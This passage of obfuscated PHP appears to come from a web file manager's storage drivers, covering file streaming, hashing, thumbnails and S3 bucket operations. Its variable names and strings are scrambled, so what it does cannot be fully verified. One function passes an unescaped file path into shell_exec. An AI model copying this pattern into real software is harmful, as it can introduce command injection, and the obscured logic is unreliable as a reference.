$­Ÿ¯©ã²[12]; } return substr($¥†¯Ûà, 0, $İ™ûÔé¹ + 1); } public function hashSimple($¾¡›­å³) { $¦‘½–‚ =& $_SERVER[ñ÷§¡å]; if (!$¾¡›­å³) { return md5($¦‘½–‚[12]); } $°Œ³»î = $this->size($¾¡›­å³); $ºú‰¤ = 200; $‡ÄúûÉƒ = 50; if ($°Œ³»î <= $ºú‰¤ * $‡ÄúûÉƒ) { return $this->hashMd5($¾¡›­å³) . $°Œ³»î; } $ìÇà·Â = intval($°Œ³»î / $‡ÄúûÉƒ); $©·Š·¡ù = $¦‘½–‚[12]; for ($Â½®ÈÛ = 0; $Â½®ÈÛ < $‡ÄúûÉƒ; $Â½®ÈÛ++) { $©·Š·¡ù .= $this->fileSubstr($¾¡›­å³, $ìÇà·Â * $Â½®ÈÛ, $ºú‰¤); } $©·Š·¡ù .= $this->fileSubstr($¾¡›­å³, $°Œ³»î - $ºú‰¤, $ºú‰¤); return md5($©·Š·¡ù) . $°Œ³»î; } public static $md5Cache = array(); public function hashMd5($üšêÕ³ï) { if (!$üšêÕ³ï) { return md5($_SERVER[ñ÷§¡å][12]); } $üšêÕ³ï = $this->iconvSystem($üšêÕ³ï); if (isset(self::$md5Cache[$üšêÕ³ï])) { return self::$md5Cache[$üšêÕ³ï]; } self::$md5Cache[$üšêÕ³ï] = $this->hashMd5Shell($üšêÕ³ï); if (!self::$md5Cache[$üšêÕ³ï]) { self::$md5Cache[$üšêÕ³ï] = @md5_file($üšêÕ³ï); } return self::$md5Cache[$üšêÕ³ï]; } private function hashMd5Shell($›ÊÅ¹³ˆ) { $¬Åæö‘À =& $_SERVER[ñ÷§¡å]; if (!$›ÊÅ¹³ˆ) { return md5($¬Åæö‘À[12]); } if (!function_exists($¬Åæö‘À[108])) { return !1; } $µ³ª¸Ññ = array($¬Åæö‘À[109], $¬Åæö‘À[110]); $¶åŒç¨¹ = Cache::get($¬Åæö‘À[111]); if (!$¶åŒç¨¹) { $ üÔÆÀ° = BASIC_PATH . $¬Åæö‘À[112]; $ûÕô€’Ó = md5_file($ üÔÆÀ°); $¶åŒç¨¹ = $¬Åæö‘À[113]; foreach ($µ³ª¸Ññ as $‘ìœÕô) { $¾ª©Ñ¤Å = shell_exec($‘ìœÕô . "\40\x22{$ üÔÆÀ°}\x22"); if ($¾ª©Ñ¤Å && substr(trim($¾ª©Ñ¤Å), 0, 32) == $ûÕô€’Ó) { $¶åŒç¨¹ = $‘ìœÕô; break; } } Cache::set($¬Åæö‘À[111], $¶åŒç¨¹, 3600); } if ($¶åŒç¨¹ == $¬Åæö‘À[113]) { return !1; } $¾ª©Ñ¤Å = shell_exec($¶åŒç¨¹ . "\40\42{$›ÊÅ¹³ˆ}\x22"); $¾ª©Ñ¤Å = str_replace($¬Åæö‘À[114], $¬Åæö‘À[12], $¾ª©Ñ¤Å); return substr($¾ª©Ñ¤Å, 0, 32); } public function link($¾†¦üø‡) { return $¾†¦üø‡; } public function fileOut($ŞŸÒ¼ˆà, $×ë’Â‹£ = false, $Î‚»ŠŠ± = false, $ÒšıÜ— = '') { $¹´–ÚÂ® =& $_SERVER[ñ÷§¡å]; $this->cacheMethod(null, null); if (!$ŞŸÒ¼ˆà || !$this->exist($ŞŸÒ¼ˆà)) { show_json(LNG($¹´–ÚÂ®[115]), !1, $Î‚»ŠŠ±); } $…×“úşø = $this->getType() == $¹´–ÚÂ®[116]; $×öï¢ = $GLOBALS[$¹´–ÚÂ®[6]][$¹´–ÚÂ®[99]][$¹´–ÚÂ®[117]][$¹´–ÚÂ®[118]]; $ïÛ¿šØ’ = (double) $GLOBALS[$¹´–ÚÂ®[6]][$¹´–ÚÂ®[99]][$¹´–ÚÂ®[117]][$¹´–ÚÂ®[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ßğ›¯¤ = $this->infoFull($ŞŸÒ¼ˆà); $‡ª•‡Õ³ = $ßğ›¯¤[$¹´–ÚÂ®[86]]; $ğÀ¬ÑÑï = gmdate($¹´–ÚÂ®[120], $ßğ›¯¤[$¹´–ÚÂ®[95]]); $¸´¶ıû‡ = $Î‚»ŠŠ± ? $Î‚»ŠŠ± : $this->iconvApp($ßğ›¯¤[$¹´–ÚÂ®[32]]); $Óå¨³¦½ = 0; $ïçš†¢Í = $‡ª•‡Õ³ - 1; $—ÆçªÎ¢ = $this->ext($¸´¶ıû‡); if (in_array($—ÆçªÎ¢, array($¹´–ÚÂ®[121], $¹´–ÚÂ®[122], $¹´–ÚÂ®[123], $¹´–ÚÂ®[124]))) { $—ÆçªÎ¢ = $¹´–ÚÂ®[125]; } if (in_array($—ÆçªÎ¢, array($¹´–ÚÂ®[126]))) { $—ÆçªÎ¢ = $¹´–ÚÂ®[127]; } if (!$ÒšıÜ—) { $ÒšıÜ— = md5($ğÀ¬ÑÑï . $this->hashSimple($ŞŸÒ¼ˆà)); } $ÒšıÜ— = $¹´–ÚÂ®[128] . $ÒšıÜ— . $¹´–ÚÂ®[128]; $ŒÖ£Äâ” = get_file_mime($—ÆçªÎ¢); $§åËÖıò = !0; $§åËÖıò = isset($_GET[$¹´–ÚÂ®[129]]) ? !1 : !0; if ($×ë’Â‹£ === !1 && !mime_support($ŒÖ£Äâ”)) { $ŒÖ£Äâ” = $¹´–ÚÂ®[130]; } header($¹´–ÚÂ®[131]); header($¹´–ÚÂ®[132] . $ŒÖ£Äâ”); $ƒÅÂ·¥¸ = rawurlencode($¸´¶ıû‡); $ƒÅÂ·¥¸ = $¹´–ÚÂ®[128] . $ƒÅÂ·¥¸ . $¹´–ÚÂ®[133] . $ƒÅÂ·¥¸; if ($×ë’Â‹£) { header($¹´–ÚÂ®[134]); header($¹´–ÚÂ®[135] . $ƒÅÂ·¥¸); } else { if ($§åËÖıò) { header($¹´–ÚÂ®[136] . $ƒÅÂ·¥¸); } } header($¹´–ÚÂ®[137] . gmdate($¹´–ÚÂ®[120], time() + 3600 * 24 * 30) . $¹´–ÚÂ®[138]); header($¹´–ÚÂ®[139]); header($¹´–ÚÂ®[140]); header($¹´–ÚÂ®[141]); if (isset($_SERVER[$¹´–ÚÂ®[142]]) && strtotime($_SERVER[$¹´–ÚÂ®[142]]) == $ßğ›¯¤[$¹´–ÚÂ®[95]]) { header($¹´–ÚÂ®[143], !0, 304); die; } if (isset($_SERVER[$¹´–ÚÂ®[144]]) && $_SERVER[$¹´–ÚÂ®[144]] == $ÒšıÜ—) { header($¹´–ÚÂ®[145] . $ÒšıÜ—, !0, 304); die; } header($¹´–ÚÂ®[145] . $ÒšıÜ—); header($¹´–ÚÂ®[146] . $ğÀ¬ÑÑï . $¹´–ÚÂ®[138]); header($¹´–ÚÂ®[147] . $¸´¶ıû‡); header($¹´–ÚÂ®[148]); header($¹´–ÚÂ®[149] . $‡ª•‡Õ³); header($¹´–ÚÂ®[150]); if (!$×ë’Â‹£ && $—ÆçªÎ¢ == $¹´–ÚÂ®[151]) { if ($‡ª•‡Õ³ > 1024 * 1024 * 5) { die; } $Îæş„Ÿå = $this->getContent($ŞŸÒ¼ˆà); $Îæş„Ÿå = Html::clearSVG($Îæş„Ÿå); header($¹´–ÚÂ®[152] . strlen($Îæş„Ÿå)); echo $Îæş„Ÿå; die; } $¡Êã¶† = strtolower($_SERVER[$¹´–ÚÂ®[153]]); if ($…×“úşø && $¡Êã¶† && $×öï¢) { if (strstr($¡Êã¶†, $¹´–ÚÂ®[154])) { header($¹´–ÚÂ®[155] . $ŞŸÒ¼ˆà); } else { if (strstr($¡Êã¶†, $¹´–ÚÂ®[156])) { header($¹´–ÚÂ®[157] . $ŞŸÒ¼ˆà); } else { if (strstr($¡Êã¶†, $¹´–ÚÂ®[158])) { header($¹´–ÚÂ®[159] . $ŞŸÒ¼ˆà); } } } if ($ïÛ¿šØ’) { header($¹´–ÚÂ®[160] . $ïÛ¿šØ’); } return; } if (isset($_SERVER[$¹´–ÚÂ®[161]])) { if (preg_match($¹´–ÚÂ®[162], $_SERVER[$¹´–ÚÂ®[161]], $´öÅç¥ö)) { $Óå¨³¦½ = intval($´öÅç¥ö[1]); if (!empty($´öÅç¥ö[2])) { $ïçš†¢Í = intval($´öÅç¥ö[2]); } } header($¹´–ÚÂ®[163]); header("\x43\157\x6e\164\x65\x6e\x74\55\122\141\156\147\145\x3a\40\142\171\164\x65\x73\x20{$Óå¨³¦½}\55{$ïçš†¢Í}\x2f" . $‡ª•‡Õ³); } else { header($¹´–ÚÂ®[164]); } header($¹´–ÚÂ®[165]); $‚¶»æ±á = !0; if ($_SERVER[$¹´–ÚÂ®[166]] == $¹´–ÚÂ®[167] && $‡ª•‡Õ³ > 1204 * 1024 * 1024 * 2) { $‚¶»æ±á = !1; } if ($‚¶»æ±á) { header($¹´–ÚÂ®[168] . ($ïçš†¢Í - $Óå¨³¦½ + 1)); } if ($_SERVER[$¹´–ÚÂ®[169]] == $¹´–ÚÂ®[170]) { return; } $ı³²¦òÁ = 1024 * 100; $³Òù‡™ = 0; if ($ïÛ¿šØ’) { $³Òù‡™ = intval(1000 * 1000 * ($ı³²¦òÁ / $ïÛ¿šØ’)); } while ($Óå¨³¦½ <= $ïçš†¢Í) { $ƒšà¼‹å = timeFloat(); check_abort(); $˜úÀ = $ïçš†¢Í - $Óå¨³¦½ + 1; if ($˜úÀ <= $ı³²¦òÁ) { $ı³²¦òÁ = $˜úÀ; } echo $this->fileSubstr($ŞŸÒ¼ˆà, $Óå¨³¦½, $ı³²¦òÁ); $Óå¨³¦½ += $ı³²¦òÁ; if ($ı³²¦òÁ == $˜úÀ) { $Óå¨³¦½ = $ïçš†¢Í + 1; } if ($³Òù‡™) { $€¶ñÎ = intval(1000 * 1000 * (timeFloat() - $ƒšà¼‹å)); $¼æ¹èäï = $³Òù‡™ - $€¶ñÎ; if ($¼æ¹èäï > 5) { usleep($¼æ¹èäï); } } } } public function fileOutServer($®£±‚£İ, $¡ø¬¾Ë = false, $®ì‚‡ıÄ = false, $úê·¼ëá = '') { $this->fileOut($®£±‚£İ, $¡ø¬¾Ë, $®ì‚‡ıÄ, $úê·¼ëá); } public function fileOutLink($ò¿ñµ„Ù) { header($_SERVER[ñ÷§¡å][171] . $ò¿ñµ„Ù); die; } public function cacheMethod($û —ç°È, $‹ÇşøÑ, $è¸¢ÒÊ = null) { $ê¶À„ØÂ =& $_SERVER[ñ÷§¡å]; static $ş“ªÊØ² = array(); $‡æÒ•ç = $‹ÇşøÑ ? ltrim($this->getPathOuter($‹ÇşøÑ), $ê¶À„ØÂ[8]) : $ê¶À„ØÂ[12]; $–Öõ‡Õ = $ê¶À„ØÂ[172] . $û —ç°È . $ê¶À„ØÂ[173] . rtrim($‡æÒ•ç, $ê¶À„ØÂ[8]); if (is_null($û —ç°È)) { $ş“ªÊØ² = array(); return; } if (is_null($‹ÇşøÑ)) { foreach ($ş“ªÊØ² as $–Öõ‡Õ => $§‡Àì«™) { if (!strstr($–Öõ‡Õ, $ê¶À„ØÂ[172] . $û —ç°È . $ê¶À„ØÂ[174])) { continue; } unset($ş“ªÊØ²[$–Öõ‡Õ]); } return; } if (!is_null($è¸¢ÒÊ)) { $ş“ªÊØ²[$–Öõ‡Õ] = $è¸¢ÒÊ; return; } $õ—æå·® = isset($ş“ªÊØ²[$–Öõ‡Õ]) ? $ş“ªÊØ²[$–Öõ‡Õ] : null; if (!is_null($õ—æå·®)) { return $õ—æå·®; } $õ—æå·® = $this->{$û —ç°È}($‹ÇşøÑ); $ş“ªÊØ²[$–Öõ‡Õ] = $õ—æå·®; return $õ—æå·®; } public function cacheMethodInfoSet($óĞ¿ÀÑ‘, $¾ìË½Ô‡, $¨ÆÆ¨•ä = false) { $à‰¹„¼ =& $_SERVER[ñ÷§¡å]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($à‰¹„¼[175], $óĞ¿ÀÑ‘, $¾ìË½Ô‡); $this->cacheMethod($à‰¹„¼[176], $óĞ¿ÀÑ‘, $¾ìË½Ô‡ ? !1 : !0); if (is_array($¨ÆÆ¨•ä)) { $this->cacheMethod($à‰¹„¼[177], $óĞ¿ÀÑ‘, $¨ÆÆ¨•ä); } } public function fileOutImage($¼šş„ÜŠ, $œèá»ı = 250) { $çÀàèØ« =& $_SERVER[ñ÷§¡å]; set_timeout(); if (substr($¼šş„ÜŠ, 0, 4) == $çÀàèØ«[158]) { $this->fileOutLink($¼šş„ÜŠ); } $ó÷Ò¥£  = $this->info($¼šş„ÜŠ); $ÔÚ­©™ò = $ó÷Ò¥£ [$çÀàèØ«[32]]; $•«Û´Ş = !1; if (isset($GLOBALS[$çÀàèØ«[178]]) && $GLOBALS[$çÀàèØ«[178]][$çÀàèØ«[94]] == $ó÷Ò¥£ [$çÀàèØ«[94]]) { $Ü¶‰° = $GLOBALS[$çÀàèØ«[178]][$çÀàèØ«[179]]; if (!$ó÷Ò¥£ [$çÀàèØ«[180]]) { $ó÷Ò¥£ [$çÀàèØ«[180]] = $GLOBALS[$çÀàèØ«[178]]; } if (isset($Ü¶‰°[$çÀàèØ«[181]])) { if ($Ü¶‰°[$çÀàèØ«[181]] <= $œèá»ı && $Ü¶‰°[$çÀàèØ«[182]] <= $œèá»ı) { $•«Û´Ş = !0; } } $ÔÚ­©™ò = $ó÷Ò¥£ [$çÀàèØ«[180]][$çÀàèØ«[32]]; } if ($ó÷Ò¥£ [$çÀàèØ«[86]] <= 1024 * 50 || $•«Û´Ş || !function_exists($çÀàèØ«[183]) || $ó÷Ò¥£ [$çÀàèØ«[184]] == $çÀàèØ«[185]) { return $this->fileOut($¼šş„ÜŠ, !1, $ÔÚ­©™ò); } if (isset($ó÷Ò¥£ [$çÀàèØ«[180]][$çÀàèØ«[186]])) { $º©©³˜º = $ó÷Ò¥£ [$çÀàèØ«[180]][$çÀàèØ«[186]]; } else { if (isset($ó÷Ò¥£ [$çÀàèØ«[180]][$çÀàèØ«[187]])) { $º©©³˜º = $ó÷Ò¥£ [$çÀàèØ«[180]][$çÀàèØ«[187]]; } } if (!$º©©³˜º) { $º©©³˜º = md5("{$ó÷Ò¥£ [$çÀàèØ«[32]]}\x5f{$ó÷Ò¥£ [$çÀàèØ«[94]]}\x5f{$ó÷Ò¥£ [$çÀàèØ«[86]]}\137{$œèá»ı}"); } $ù¯®×€¡ = "{$º©©³˜º}\137{$œèá»ı}\x2e\160\x6e\x67"; if (!($äîçø¨Î = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $çÀàèØ«[188]))) { $á´³Ãğ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $çÀàèØ«[189]); } else { $á´³Ãğ = KodIO::make($äîçø¨Î); } if ($äîçø¨Î = IO::fileNameExist($á´³Ãğ, $ù¯®×€¡)) { $Öê‘ã§û = KodIO::make($äîçø¨Î); return IO::fileOut($Öê‘ã§û, !1, $ÔÚ­©™ò); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Öê‘ã§û = DATA_THUMB . $ù¯®×€¡; del_file($Öê‘ã§û); if (!@file_exists($Öê‘ã§û)) { $£’„£Ç = TEMP_FILES; if (!is_dir($£’„£Ç)) { mk_dir($£’„£Ç); } $ÄõÉŸ÷ = $£’„£Ç . $º©©³˜º . $çÀàèØ«[10] . $ó÷Ò¥£ [$çÀàèØ«[184]]; if (!@file_exists($ÄõÉŸ÷)) { $ÄõÉŸ÷ = $this->download($¼šş„ÜŠ, $ÄõÉŸ÷); } ImageThumb::createThumb($ÄõÉŸ÷, $Öê‘ã§û, $œèá»ı, $œèá»ı * 10); } if (!file_exists($Öê‘ã§û) || filesize($Öê‘ã§û) < 100) { return @file_exists($ÄõÉŸ÷) ? IO::fileOut($ÄõÉŸ÷) : $this->fileOut($¼šş„ÜŠ); } if (!($ƒ÷Œ€Áâ = IO::move($Öê‘ã§û, $á´³Ãğ))) { return IO::fileOut($Öê‘ã§û); } del_file($Öê‘ã§û); IO::fileOut($ƒ÷Œ€Áâ); } public function fileOutImageServer($‹½ğÊ—, $‹öñŸ‡Ê = 250) { $this->fileOutImage($‹½ğÊ—, $‹öñŸ‡Ê); } public function fileNameAuto($¡ûèŠİ¾, $»Öå—Â, $ôßÉáÀ = REPEAT_RENAME, $˜°ÎÚÁ = false) { $ı‹›ÇŞ· =& $_SERVER[ñ÷§¡å]; $—ˆ¢™ç¿ = $¡ûèŠİ¾ === $ı‹›ÇŞ·[12] ? $»Öå—Â : rtrim($¡ûèŠİ¾, $ı‹›ÇŞ·[8]) . $ı‹›ÇŞ·[8] . $»Öå—Â; if ($ôßÉáÀ == REPEAT_REPLACE || !$this->exist($—ˆ¢™ç¿) || $˜°ÎÚÁ && $ôßÉáÀ != REPEAT_RENAME_FOLDER) { return $»Öå—Â; } if ($ôßÉáÀ == REPEAT_SKIP) { return !1; } $àì©ó†« = $ı‹›ÇŞ·[10] . get_path_ext($»Öå—Â); $àì©ó†« = $àì©ó†« == $ı‹›ÇŞ·[10] || $˜°ÎÚÁ ? $ı‹›ÇŞ·[12] : $àì©ó†«; $†ìûãÇğ = 1; $ò¹¹ë¥Ø = substr($»Öå—Â, 0, strlen($»Öå—Â) - strlen($àì©ó†«)); $ÙÀ©íƒ” = $ò¹¹ë¥Ø . "\x28{$†ìûãÇğ}\51{$àì©ó†«}"; while ($this->exist(rtrim($¡ûèŠİ¾, $ı‹›ÇŞ·[8]) . $ı‹›ÇŞ·[8] . $ÙÀ©íƒ”)) { $ÙÀ©íƒ” = $ò¹¹ë¥Ø . "\50{$†ìûãÇğ}\51{$àì©ó†«}"; $†ìûãÇğ++; } return $ÙÀ©íƒ”; } private function fileNameAutoList($Í•Ñ‰¡, $ÈÕˆè»é, $õ§¤øñ = false) { $à…ŞèÁµ =& $_SERVER[ñ÷§¡å]; $÷à÷ôâ = $this->listPath($Í•Ñ‰¡, !0); $÷à÷ôâ = array_merge($÷à÷ôâ[$à…ŞèÁµ[92]], $÷à÷ôâ[$à…ŞèÁµ[93]]); $¯óÅ©ğ = array_to_keyvalue($÷à÷ôâ, $à…ŞèÁµ[12], $à…ŞèÁµ[32]); $çİ’×Ä€ = $à…ŞèÁµ[10] . get_path_ext($ÈÕˆè»é); $çİ’×Ä€ = $çİ’×Ä€ == $à…ŞèÁµ[10] || $õ§¤øñ ? $à…ŞèÁµ[12] : $çİ’×Ä€; $Ğ¥¼†Ø = substr($ÈÕˆè»é, 0, strlen($ÈÕˆè»é) - strlen($çİ’×Ä€)); $ĞÈâÙ–À = $Ğ¥¼†Ø . "\50\x30\51{$çİ’×Ä€}"; for ($±ù¡ª¢ = 1; $±ù¡ª¢ <= count($¯óÅ©ğ) + 1; $±ù¡ª¢++) { $ĞÈâÙ–À = $Ğ¥¼†Ø . "\x28{$±ù¡ª¢}\x29{$çİ’×Ä€}"; if (!in_array_not_case($ĞÈâÙ–À, $¯óÅ©ğ)) { return $ĞÈâÙ–À; } } return $ĞÈâÙ–À; } public function listAllFiles($˜©×ƒô, $®ûç¹§, $Û„ ˆû‚ = array()) { $ˆ”»¬« =& $_SERVER[ñ÷§¡å]; if (empty($®ûç¹§)) { return array(); } $ñ¼óÕ·ˆ = array(); $˜©×ƒô = trim($˜©×ƒô, $ˆ”»¬«[8]); foreach ($®ûç¹§ as $›¿ÅÅÂ¹) { $ÎüÀ²ó = ltrim(substr(trim($›¿ÅÅÂ¹, $ˆ”»¬«[8]), strlen($˜©×ƒô)), $ˆ”»¬«[8]); $ñ¼óÕ·ˆ = array_merge($ñ¼óÕ·ˆ, $this->slicePath($ÎüÀ²ó)); } $ï¡ïªñ† = array(); foreach (array_unique($ñ¼óÕ·ˆ) as $›¿ÅÅÂ¹) { $ğ¡ìı¶ø = array($ˆ”»¬«[94] => $this->getPathOuter($ˆ”»¬«[8] . $˜©×ƒô . $ˆ”»¬«[8] . $›¿ÅÅÂ¹), $ˆ”»¬«[85] => 1, $ˆ”»¬«[86] => 0); if (substr($›¿ÅÅÂ¹, -1) != $ˆ”»¬«[8]) { $ğ¡ìı¶ø[$ˆ”»¬«[85]] = 0; $ºÕÊ·Ç¸ = $this->getPath($˜©×ƒô . $ˆ”»¬«[8] . $›¿ÅÅÂ¹); $ğ¡ìı¶ø[$ˆ”»¬«[86]] = isset($Û„ ˆû‚[$ºÕÊ·Ç¸]) ? $Û„ ˆû‚[$ºÕÊ·Ç¸] : $this->size($ºÕÊ·Ç¸); } $ï¡ïªñ†[] = $ğ¡ìı¶ø; } return $ï¡ïªñ†; } public function slicePath($Â–ñõ‚ı) { $Õı·“Çû =& $_SERVER[ñ÷§¡å]; $ş–Äí„Ô = explode($Õı·“Çû[8], trim($Â–ñõ‚ı, $Õı·“Çû[8])); $™æùûÇù = 0; do { ++$™æùûÇù; $íÀœ»óÍ[] = implode($Õı·“Çû[8], array_slice($ş–Äí„Ô, 0, $™æùûÇù)) . $Õı·“Çû[8]; } while ($™æùûÇù < count($ş–Äí„Ô)); $íÀœ»óÍ[count($ş–Äí„Ô) - 1] = $Â–ñõ‚ı; return $íÀœ»óÍ; } public function getHost() { $µÎâæœô =& $_SERVER[ñ÷§¡å]; $ê«Åµë = parse_url(trim($this->domain, $µÎâæœô[8])); $áŞï£û± = isset($ê«Åµë[$µÎâæœô[190]]) ? $ê«Åµë[$µÎâæœô[190]] : http_type(); $´´åé¬Û = isset($ê«Åµë[$µÎâæœô[191]]) ? $ê«Åµë[$µÎâæœô[191]] : $ê«Åµë[$µÎâæœô[94]]; if (isset($ê«Åµë[$µÎâæœô[192]])) { $´´åé¬Û .= $µÎâæœô[4] . $ê«Åµë[$µÎâæœô[192]]; } return $áŞï£û± . $µÎâæœô[193] . $´´åé¬Û; } public function pathEncode($¥ÎÒ‰ó) { $¾ºÁÃ€â =& $_SERVER[ñ÷§¡å]; return str_replace($¾ºÁÃ€â[194], $¾ºÁÃ€â[8], rawurlencode($¥ÎÒ‰ó)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($ç›ğÈµ¾) { set_timeout(); require_once SDK_DIR . $_SERVER[ñ÷§¡å][195]; parent::__construct(); $this->_init($ç›ğÈµ¾); } public function _init($öÎè‚®à) { foreach ($öÎè‚®à as $º´×‘…¤ => $È©Äê) { if (isset($this->{$º´×‘…¤})) { $this->{$º´×‘…¤} = $È©Äê; } } $this->endpoint = $öÎè‚®à[$_SERVER[ñ÷§¡å][196]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¤şİñ = "\x76\64") { $this->signVer = $¤şİñ; $this->client->setSignatureVersion($¤şİñ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $«Ø×ÔÑ„ =& $_SERVER[ñ÷§¡å]; $°§Á…äæ = $this->getBucketCors(); if (!$°§Á…äæ || !is_array($°§Á…äæ)) { return !1; } if ($°§Á…äæ[$«Ø×ÔÑ„[197]] != $«Ø×ÔÑ„[198] || $°§Á…äæ[$«Ø×ÔÑ„[199]] != $«Ø×ÔÑ„[198]) { return !1; } $Şú§‚û = array_map($«Ø×ÔÑ„[200], $°§Á…äæ[$«Ø×ÔÑ„[201]]); if (!is_array($Şú§‚û)) { $Şú§‚û = array(); } $†Åşî¡­ = array($«Ø×ÔÑ„[202], $«Ø×ÔÑ„[203], $«Ø×ÔÑ„[204], $«Ø×ÔÑ„[205], $«Ø×ÔÑ„[206]); $çÒ§‚Ğ = array_diff($†Åşî¡­, $Şú§‚û); return empty($çÒ§‚Ğ); } public function mkfile($¥ÃÙ—ó, $çÀ›£Øµ = '', $½Õ¬Â…ğ = REPEAT_RENAME) { $š­×´©š = $this->setContent($¥ÃÙ—ó, $çÀ›£Øµ); if ($š­×´©š !== !1) { return $this->getPathOuter($¥ÃÙ—ó); } return !1; } public function mkdir($øì¢É é, $àï¸¡ªŞ = REPEAT_SKIP) { $§£ââ× =& $_SERVER[ñ÷§¡å]; if (empty($øì¢É é) && $øì¢É é !== $§£ââ×[207]) { return !1; } if ($àï¸¡ªŞ && $this->_isFolder($øì¢É é)) { return $this->getPathOuter($øì¢É é); } $ÍÜ·¥ÎÎ = $this->setContent($øì¢É é, $§£ââ×[12], !0); if ($ÍÜ·¥ÎÎ !== !1) { return $this->getPathOuter($øì¢É é); } return !1; } public function copyFile($ü™ïÔÇØ, $ÁªôœƒÀ, $Í¦ŒÜ—ü = array()) { $¢èÓ¯Ï =& $_SERVER[ñ÷§¡å]; $»Õ© Í = $this->objectMeta($ü™ïÔÇØ); if (!$»Õ© Í) { return !1; } if ($»Õ© Í[$¢èÓ¯Ï[86]] <= 1024 * 1024 * 200) { $šá±ş—ò = $this->client->copyObject($this->bucket, $ü™ïÔÇØ, $this->bucket, $ÁªôœƒÀ, $¢èÓ¯Ï[208], $Í¦ŒÜ—ü); } else { $šá±ş—ò = $this->client->multiCopyObject($this->bucket, $ü™ïÔÇØ, $this->bucket, $ÁªôœƒÀ, $Í¦ŒÜ—ü); } $šá±ş—ò = $šá±ş—ò ? $this->getPathOuter($ÁªôœƒÀ) : !1; return $šá±ş—ò; } public function moveFile($åî¡îûŒ, $–¬˜Œëß) { if ($this->copyFile($åî¡îûŒ, $–¬˜Œëß)) { $this->delFile($åî¡îûŒ); return $this->getPathOuter($–¬˜Œëß); } return !1; } public function delFile($‘§îÕ†) { return $this->client->deleteObject($this->bucket, $‘§îÕ†); } public function delFolder($üšÈØÖ…) { $­•îê¿ =& $_SERVER[ñ÷§¡å]; if (!$this->exist($üšÈØÖ…)) { return !0; } $this->listItemCache = !1; $ªìÃ®¨ = $this->fileList($üšÈØÖ…); $this->listItemCache = !0; $°Ø€İŞö = trim($üšÈØÖ…, $­•îê¿[8]) . $­•îê¿[8]; if (!empty($üšÈØÖ…) && $üšÈØÖ… !== $­•îê¿[207] && !in_array($°Ø€İŞö, $ªìÃ®¨[$­•îê¿[92]])) { $ªìÃ®¨[$­•îê¿[92]][] = $°Ø€İŞö; } $òèØ Æ = $this->delByBatch($ªìÃ®¨[$­•îê¿[93]]); if (!$òèØ Æ) { return !1; } $òèØ Æ = $this->delByBatch($ªìÃ®¨[$­•îê¿[92]]); if (!$òèØ Æ) { return !1; } return $this->delFile($°Ø€İŞö); } private function delByBatch($èæ¬ÇĞï) { foreach (array_chunk($èæ¬ÇĞï, 1000) as $Ù®¬øöó) { $ñ»éªÂ = $this->client->deleteObjects($this->bucket, $Ù®¬øöó); if (!$ñ»éªÂ) { return !1; } } return !0; } public function rename($¦Ó«Ã„İ, $ïÀÁ£¨Œ) { return $this->renameObject($¦Ó«Ã„İ, $ïÀÁ£¨Œ); } public function listPath($í¹òŸáù, $ºÎ¸Ìæú = false) { $Æ…˜¸Üë =& $_SERVER[ñ÷§¡å]; $·‡•—˜ = $this->fileList($í¹òŸáù, $Æ…˜¸Üë[8], !0); foreach ($·‡•—˜[$Æ…˜¸Üë[92]] as $Ê©ÅĞá‚ => $×Ñ–šëà) { $·‡•—˜[$Æ…˜¸Üë[92]][$Ê©ÅĞá‚] = $this->folderInfo($×Ñ–šëà, $ºÎ¸Ìæú, $×Ñ–šëà); } foreach ($·‡•—˜[$Æ…˜¸Üë[93]] as $Ê©ÅĞá‚ => $×Ñ–šëà) { $·‡•—˜[$Æ…˜¸Üë[93]][$Ê©ÅĞá‚] = $this->fileInfo($×Ñ–šëà[$Æ…˜¸Üë[32]], $ºÎ¸Ìæú, $×Ñ–šëà); } return $·‡•—˜; } protected function infoChildren($ÕŒ¼³Ù‡, &$µíé´²) { $°©×ì‹ç =& $_SERVER[ñ÷§¡å]; $å¬Ù©İÚ = $this->fileList($ÕŒ¼³Ù‡, $°©×ì‹ç[12], !0); $µíé´²[$°©×ì‹ç[88]] += count($å¬Ù©İÚ[$°©×ì‹ç[92]]); $µíé´²[$°©×ì‹ç[87]] += count($å¬Ù©İÚ[$°©×ì‹ç[93]]); foreach ($å¬Ù©İÚ[$°©×ì‹ç[93]] as $ïçšş”ø) { if (!$ïçšş”ø || !$ïçšş”ø[$°©×ì‹ç[86]]) { continue; } $µíé´²[$°©×ì‹ç[86]] += $ïçšş”ø[$°©×ì‹ç[86]]; } } private function fileInfo($ê©õµËŞ, $Æ‹å‘¼ = false, $Œ™«¬Š¬ = array()) { $ü½¢Ğ =& $_SERVER[ñ÷§¡å]; $“…¸ˆÆš = array($ü½¢Ğ[32] => $this->pathThis($ê©õµËŞ), $ü½¢Ğ[94] => $this->getPathOuter($ê©õµËŞ), $ü½¢Ğ[33] => $ü½¢Ğ[209], $ü½¢Ğ[184] => $this->ext($ê©õµËŞ), $ü½¢Ğ[86] => isset($Œ™«¬Š¬[$ü½¢Ğ[86]]) ? $Œ™«¬Š¬[$ü½¢Ğ[86]] : 0); if ($Æ‹å‘¼) { return $“…¸ˆÆš; } $“…¸ˆÆš[$ü½¢Ğ[210]] = $“…¸ˆÆš[$ü½¢Ğ[95]] = 0; $“…¸ˆÆš[$ü½¢Ğ[211]] = $“…¸ˆÆš[$ü½¢Ğ[212]] = !0; if (empty($Œ™«¬Š¬)) { $Œ™«¬Š¬ = $this->objectMeta($ê©õµËŞ); if (!$Œ™«¬Š¬) { return $“…¸ˆÆš; } } if (isset($Œ™«¬Š¬[$ü½¢Ğ[213]])) { $“…¸ˆÆš[$ü½¢Ğ[95]] = $Œ™«¬Š¬[$ü½¢Ğ[213]]; } if (isset($Œ™«¬Š¬[$ü½¢Ğ[86]])) { $“…¸ˆÆš[$ü½¢Ğ[86]] = 